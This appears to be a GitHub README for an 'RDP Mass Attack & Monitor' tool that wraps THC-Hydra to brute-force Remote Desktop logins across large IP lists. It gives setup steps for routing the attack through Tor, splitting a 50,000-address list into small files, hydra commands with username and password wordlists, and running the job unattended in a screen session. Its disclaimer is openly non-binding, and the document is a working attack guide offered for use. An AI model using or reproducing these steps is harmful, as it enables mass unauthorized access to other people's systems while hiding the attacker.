# RDP Mass Attack & Monitor

Please don't use in military or secret service organizations, or for illegal
purposes. (This is a wish and non-binding - most such people do not care about
laws and ethics anyway - and tell themselves they are one of the good ones.)

#### As you know THC-Hydra is not very happy with massive lists when attacking RDP. It either errors out completely or provides false negatives.

![monitor sh](https://user-images.githubusercontent.com/100805450/156768359-9081427b-199a-40ed-a69e-31495a633878.png)

------------

### Prerequisites:
As you might understand from the description it uses thc-hydra (tested on v.9.3)
Use the latest release or compile it yourself:
https://github.com/vanhauser-thc/thc-hydra

1. Tor services are required, remove code in `attack.sh` below to not use proxies.
```bash
  HYDRA_PROXY=socks5://l:p@127.0.0.1:9050
  export HYDRA_PROXY
  printenv | grep HYDRA
  sleep 5
```
2. Create folders for IP source lists and used IP source lists:
```bash
mkdir data/ data-tested/
```
3. Have the IP list split into many files with 4-5 IP addresses each.
Example: 50,000 IP List should become 10,000 files with 5 IPs each.
```bash
# make sure you are inside source folder when running this command
split ip-list.txt -l 5
```
4. If you want to use username list instead one username or you want to use one password, edit `attack.sh` accordingly:
```bash
hydra -L usernames.lst -P "$password"
```
```bash
hydra -l admin -p password
```
```bash
hydra -L usernames.lst -P "$password"
```
------------

### Usage:

```bash
chmod +x attack.sh
```
I advise running the attack inside a screen session to be able to leave it running without accidentally killing it:
```bash
screen -S "attack"
./attack.sh <ip-list-location> <dictionary-location>
# example:
screen -S "attack" ./attack.sh data wordlist/dict.txt
# ^ will use every file in /home/<your user>/data/ folder as IP list and attack it with /home/<your user>/wordlist/dict.txt wordlist
# CTRL + AD to Detach from the screen
```
Script moves the used list file to "data-tested" folder and takes the next one from supplied folder. Did this for easier resume on crash or on stop.

------------

### Monitor.sh Usage:
```bash
chmod +x monitor.sh
watch -n 5 --color ./monitor.sh
```
